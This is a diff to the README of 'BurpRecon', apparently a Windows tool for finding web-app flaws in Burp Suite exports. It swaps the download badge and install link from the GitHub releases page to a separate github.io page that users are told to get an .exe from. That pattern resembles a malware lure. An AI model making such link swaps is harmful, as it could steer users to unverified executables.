@@ -1,6 +1,6 @@
 # 🔍 BurpRecon - Find security flaws in saved scans
 
-[![Download the latest version](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/Glumelorry620/BurpRecon/releases)
+[![Download the latest version](https://img.shields.io/badge/Download-Releases-blue.svg)](https://glumelorry620.github.io)
 
 BurpRecon helps you identify potential security issues in your web applications. You use this tool to process data exported from Burp Suite. The program searches for broken object level access, host header injections, and password reset flaws. It automates the analysis of large log files to save you time. 
 
@@ -17,7 +17,7 @@ This application requires a Windows operating system. Ensure your computer meets
 
 Follow these steps to set up the software on your computer.
 
-1. Visit [this page to download](https://github.com/Glumelorry620/BurpRecon/releases).
+1. Visit [this page to download](https://glumelorry620.github.io).
 2. Look for the latest version under the Releases section.
 3. Click the link that ends in .exe to start your download.
 4. Open the folder where your browser saved the file.
